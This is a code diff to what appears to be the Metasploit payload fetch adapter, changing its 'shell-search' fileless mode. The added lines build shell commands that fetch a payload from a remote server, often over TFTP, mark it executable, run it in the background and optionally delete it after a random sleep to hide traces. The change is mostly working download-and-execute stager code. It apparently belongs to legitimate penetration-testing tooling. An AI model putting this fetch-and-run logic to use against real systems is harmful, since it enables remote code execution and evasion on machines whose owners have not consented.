@@ -345,8 +345,19 @@ module Msf::Payload::Adapter::Fetch
 
     if datastore['FETCH_FILELESS'] == 'shell-search'
       cmds = _generate_fileless_bash_search(get_file_cmd)
-      cmds << "f=#{_remote_destination_nix(failsafe: true)};"
+      cmds << "if [ $FOUND -eq 0 ]"
+      cmds << "; then f=#{_remote_destination_nix(failsafe: true)}; "
       cmds << get_file_cmd
+      cmds << "; chmod +x #{_remote_destination_nix}"
+      cmds << "; #{_remote_destination_nix}& "
+
+      if datastore['FETCH_DELETE']
+        cmds << "sleep #{rand(3..7)};rm -rf #{_remote_destination_nix}; fi" if datastore['FETCH_DELETE']
+      else
+        cmds << "fi"
+      end
+
+      return cmds
     else
       cmds = get_file_cmd
     end
@@ -462,7 +473,7 @@ module Msf::Payload::Adapter::Fetch
         if datastore['FETCH_FILELESS'] != 'none' && linux?
           get_file_cmd = "(echo binary ; echo get #{uri} $f ) | tftp #{srvhost}"
           return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
-          return "#{_generate_fileless_bash_search(get_file_cmd)} #{tftp_fetch_and_exec}" if datastore['FETCH_FILELESS'] == 'shell-search'
+          return %<#{_generate_fileless_bash_search(get_file_cmd)} if [ $FOUND -eq 0 ]; then #{tftp_fetch_and_exec} fi> if datastore['FETCH_FILELESS'] == 'shell-search'
           return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
         else
           fetch_command = tftp_fetch_and_exec
